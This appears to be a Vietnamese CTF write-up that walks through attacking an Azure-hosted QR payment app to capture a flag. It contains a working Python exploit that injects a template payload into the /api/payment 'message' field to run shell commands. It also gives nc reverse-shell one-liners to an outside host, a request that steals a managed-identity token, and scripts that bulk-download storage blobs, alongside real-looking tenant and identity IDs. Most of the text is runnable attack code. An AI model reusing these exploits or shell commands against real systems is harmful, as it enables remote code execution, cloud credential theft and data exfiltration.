## Hunter

### 1. Login Azure with Service Principal
- Quăng cái JSON của BTC cho Copilot hỏi làm sao login thì được chỉ
```
az login --service-principal -u "8ea2379a-b4ef-41e7-bc64-cbf17c96a5d6" -p "[secret]" --tenant "f86939d1-b472-486f-83e9-b0a4b3fa6fec"
```
- Hỏi tiếp `how to list all my roles`
```
~ ❯ az role assignment list \                                                                                  20:06:51
  --assignee 8ea2379a-b4ef-41e7-bc64-cbf17c96a5d6 \
  --all \
  --include-inherited \
  --include-groups \
  --output table
Principal                             Role                  Scope
------------------------------------  --------------------  ---------------------------------------------------------------------------------------------------------------------------------------
8ea2379a-b4ef-41e7-bc64-cbf17c96a5d6  Log Analytics Reader  /subscriptions/1f1b2402-8543-4100-9627-59fa5ce96944/resourceGroups/qrzure/providers/Microsoft.OperationalInsights/workspaces/qrweb-logs
```
- Hỏi tiếp để tải hết log trong 30 ngày
```
#!/bin/bash

# --- Configuration ---
RESOURCE_GROUP="qrzure"
WORKSPACE_NAME="qrweb-logs"
TIME_RANGE="P30D" # Last 30 Days

# --- Get Workspace ID from the provided details ---
WORKSPACE_ID=$(az monitor log-analytics workspace show \
  --resource-group $RESOURCE_GROUP \
  --name $WORKSPACE_NAME \
  --query customerId \
  -o tsv)

if [ -z "$WORKSPACE_ID" ]; then
    echo "Error: Could not find Workspace ID for '$WORKSPACE_NAME'."
    exit 1
fi

echo "Fetching logs from Workspace: $WORKSPACE_NAME"

# --- Get all table names with data in the time range ---
# The JMESPath query below is corrected to use escaped double quotes for the key "$table"
TABLES=$(az monitor log-analytics query --workspace $WORKSPACE_ID --analytics-query "search * | summarize by \$table" --timespan $TIME_RANGE --query "[].\"\$table\"" -o tsv)

# --- Loop through each table, query logs, and convert to CSV ---
for table in $TABLES; do
    echo "Processing table: $table..."
    FILENAME="logs_${table}_last_30_days.csv"

    # Query logs and pipe the JSON output directly to jq for CSV conversion
    az monitor log-analytics query --workspace $WORKSPACE_ID --analytics-query "$table" --timespan $TIME_RANGE -o json | \
    jq -r '(.[0] | keys_unsorted) as $keys | $keys, map([.[$keys[]]])[] | @csv' > $FILENAME

    echo "==> Saved logs to $FILENAME"
done

echo "Script finished. All log files have been downloaded and converted to CSV."
```

### 2. Find the attack path in AppRequests logs 
- Xài Excel check trong logs thì thấy vài request lạ với website [qrweb-apim.azure-api.net](https://qrweb-apim.azure-api.net)
- API `/api/payment` cho phép tạo QR và lưu trên Cloud
- API `/api/scan` cho phép scan QR từ link
- Từ log thấy biến message lúc tạo QR với API /api/payment` có thể chèn command ở field `message`
- Nhờ Copilot viết ra cái script Python gọi cho lẹ, và chạy vài lệnh để biết OS, Env vars
```
import html
import json
import requests


def exec_command(command):
    url = "https://qrweb-apim.azure-api.net/api/payment"
    payload = json.dumps({
        "amount": 1,
        "recipient": "cimb",
        "message": f"<%= (global.constructor.constructor('return process')()).mainModule.require('child_process').execSync(\"{command}\").toString() %>"
    })

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0'
    }
    response = requests.request("POST", url, headers=headers, data=payload)
    response.raise_for_status()
    data = response.json()
    qrUrl = data['qrUrl']

    print(qrUrl)
    print("=================================")

    scan_url = "https://qrweb-apim.azure-api.net/api/scan"
    files = {
        'imageUrl': (None, qrUrl)
    }
    headers.pop('Content-Type')
    scan_resp = requests.post(scan_url, headers=headers, files=files)

    try:
        message = scan_resp.json()["message"]
        print(html.unescape(message))

        scan_message = scan_resp.json()["scanMessage"]
        print(html.unescape(scan_message))
    except Exception:
        print(scan_resp.text)
    print("=================================")


if __name__ == '__main__':
    exec_command('printenv')
    exec_command('cat /etc/os-release')
    exec_command('ls -lia /bin/')
    exec_command('ls -lia /usr/bin/')
```

### 3. Azure MSI Endpoint
- Thấy gì đó lạ lạ trong env nên check hỏi Copilot: `what is MSI_ENDPOINT and MSI_SECRET, then how to use`
```
MSI_ENDPOINT=http://localhost:12356/msi/token
```
- Chạy hoài không được `wget` nên đành tìm cách RCE: `how to remote control Alpine Linux v3.21 with a remote server and nc`
```
nc <REMOTE_SERVER_IP> 4444 -e /bin/sh
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc <REMOTE_SERVER_IP> 4444 > /tmp/f
```
- Chạy lại command wget và được cái token vô Azure Storage
```
wget -qO- --header="X-IDENTITY-HEADER: 5557107a-b00b-4a7c-84df-3670932d1b39" "http://localhost:12356/msi/token?resource=https://storage.azure.com/&client_id=1fe7dc1a-a88e-481f-a7df-789b126a9b49&api-version=2019-08-01"
```

### 4. Get flags from Azure Storage with checking versions and soft-deleted
- Dù hỏi Copilot và thử hết cách nhưng mình chỉ có nửa cái flag và một số cred thôi: **DF25{d4e9e6814f***
- Script để tải hết flag phía dưới (nhớ set cái ACCESS_TOKEN vô env):
```
#!/bin/bash

# ==== CONFIGURATION ====
ACCOUNT_NAME="qrwebsax3zov6py"
CONTAINER_NAME="internal"
API_VERSION="2021-08-06"
OUTPUT_DIR="./downloads"

# Check if ACCESS_TOKEN is set
if [ -z "$ACCESS_TOKEN" ]; then
  echo "[ERROR] ACCESS_TOKEN environment variable is not set."
  echo "Run: export ACCESS_TOKEN=$(az account get-access-token --resource https://storage.azure.com/ --query accessToken -o tsv)"
  exit 1
fi

mkdir -p "$OUTPUT_DIR"

# ==== STEP 1: Get list of .json blobs with versions ====
echo "[*] Fetching blob list with versions..."
curl -s -X GET \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "x-ms-version: $API_VERSION" \
  "https://${ACCOUNT_NAME}.blob.core.windows.net/${CONTAINER_NAME}?restype=container&comp=list&include=versions" \
| xmllint --format - \
| awk '/<Name>.*\.json<\/Name>/ {name=$0; getline; version=$0; gsub(/<\/?Name>/,"",name); gsub(/<\/?VersionId>/,"",version); print name, version}' \
> blob_versions.txt

echo "[*] Found $(wc -l < blob_versions.txt) blob versions to download."

# ==== STEP 2: Download each version ====
while read -r name version; do
    safe_name=$(echo "$name" | tr '/' '_')
    echo "[*] Downloading $name (version: $version)"
    curl -s -X GET \
      -H "Authorization: Bearer $ACCESS_TOKEN" \
      -H "x-ms-version: $API_VERSION" \
      "https://${ACCOUNT_NAME}.blob.core.windows.net/${CONTAINER_NAME}/${name}?versionid=${version}" \
      -o "${OUTPUT_DIR}/${safe_name}_${version}.json"
done < blob_versions.txt

echo "[✓] All downloads complete. Files saved in: $OUTPUT_DIR"
```

## Thanks CBJS!
